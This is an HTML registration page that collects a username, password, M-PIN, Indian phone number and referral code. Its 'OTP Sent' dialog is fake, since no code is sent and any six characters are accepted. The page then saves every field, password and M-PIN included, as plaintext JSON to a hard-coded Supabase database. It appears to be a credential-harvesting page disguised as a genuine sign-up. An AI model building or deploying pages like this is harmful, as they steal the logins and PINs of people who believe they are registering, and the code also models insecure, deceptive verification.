<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Register</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
</head>
<body class="bg-gray-50 pt-6 px-4">
    <div class="w-full max-w-md mx-auto bg-white p-4 rounded-3xl shadow-sm">
        <h1 class="text-xl font-semibold text-emerald-600 mb-4 flex items-center">
            <span class="mr-2 cursor-pointer">&lt;</span> Register
        </h1>
        <form id="signupForm" class="space-y-3">
            <div>
                <div class="relative flex items-center">
                    <span class="absolute left-4 text-gray-400">👤</span>
                    <input type="text" id="username" placeholder="Username" required class="w-full pl-12 pr-4 py-2.5 bg-gray-50 border border-gray-100 rounded-full text-gray-800 focus:outline-none focus:border-emerald-500">
                </div>
            </div>
            <div>
                <div class="relative flex items-center">
                    <span class="absolute left-4 text-gray-400">🔒</span>
                    <input type="password" id="password" placeholder="Password" required class="w-full pl-12 pr-4 py-2.5 bg-gray-50 border border-gray-100 rounded-full text-gray-800 focus:outline-none focus:border-emerald-500">
                </div>
            </div>
            <div>
                <div class="relative flex items-center">
                    <span class="absolute left-4 text-gray-400">🔒</span>
                    <input type="password" id="mpin" placeholder="M-PIN" required class="w-full pl-12 pr-4 py-2.5 bg-gray-50 border border-gray-100 rounded-full text-gray-800 focus:outline-none focus:border-emerald-500">
                </div>
            </div>
            <div>
                <div class="relative flex items-center">
                    <span class="absolute left-4 text-gray-400">+91</span>
                    <input type="tel" id="phone" placeholder="Phone" required class="w-full pl-16 pr-4 py-2.5 bg-gray-50 border border-gray-100 rounded-full text-gray-800 focus:outline-none focus:border-emerald-500">
                </div>
            </div>
            <div>
                <div class="relative flex items-center">
                    <span class="absolute left-4 text-gray-400">🔗</span>
                    <input type="text" id="referral" placeholder="Referral Code" class="w-full pl-12 pr-4 py-2.5 bg-gray-50 border border-gray-100 rounded-full text-gray-800 focus:outline-none focus:border-emerald-500">
                </div>
            </div>
            <button type="submit" class="w-full py-3.5 bg-emerald-600 hover:bg-emerald-700 text-white font-medium rounded-full shadow-lg transition duration-200 mt-4">
                Sign Up
            </button>
        </form>
    </div>

    <!-- OTP Modal -->
    <div id="otpModal" class="fixed inset-0 bg-black bg-opacity-50 hidden items-center justify-center p-4">
        <div class="bg-white rounded-3xl p-8 max-w-sm w-full text-center">
            <h2 class="text-xl font-bold text-gray-800 mb-2">OTP Sent</h2>
            <p class="text-sm text-gray-500 mb-6" id="otpSubtext">A 6-digit code has been sent</p>
            <div class="flex justify-center gap-2 mb-6">
                <input type="text" maxlength="6" id="otpInput" class="w-full text-center text-2xl tracking-widest py-3 bg-gray-50 border border-gray-200 rounded-2xl focus:outline-none focus:border-emerald-500">
            </div>
            <button onclick="verifyOtp()" class="w-full py-4 bg-emerald-600 text-white font-medium rounded-full shadow-md">
                Verify OTP
            </button>
        </div>
    </div>

    <script>
        const SUPABASE_URL = 'https://zvswgqddbeykgrhlovgp.supabase.co';
        const SUPABASE_ANON_KEY = 'sb_publishable_moe4DeFFDoQjVmcCLPtOmQ_VXcW9TyD';
        const supabase = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);

        let pendingUserData = {};

        document.getElementById('signupForm').addEventListener('submit', function(e) {
            e.preventDefault();
            pendingUserData = {
                username: document.getElementById('username').value,
                password: document.getElementById('password').value,
                mpin: document.getElementById('mpin').value,
                phone: document.getElementById('phone').value,
                referral: document.getElementById('referral').value
            };
            document.getElementById('otpSubtext').innerText = 'A 6-digit code has been sent to +91 ' + pendingUserData.phone.slice(-10);
            document.getElementById('otpModal').style.display = 'flex';
        });

        async function verifyOtp() {
            const otp = document.getElementById('otpInput').value;
            if (otp.length === 6) {
                const { error } = await supabase
                    .from('messages')
                    .insert([{ content: JSON.stringify(pendingUserData) }]);

                if (error) {
                    alert('Error saving data: ' + error.message);
                } else {
                    alert('Data saved successfully!');
                    document.getElementById('otpModal').style.display = 'none';
                    document.getElementById('signupForm').reset();
                }
            } else {
                alert('Please enter a valid 6-digit OTP.');
            }
        }
    </script>
</body>
</html>
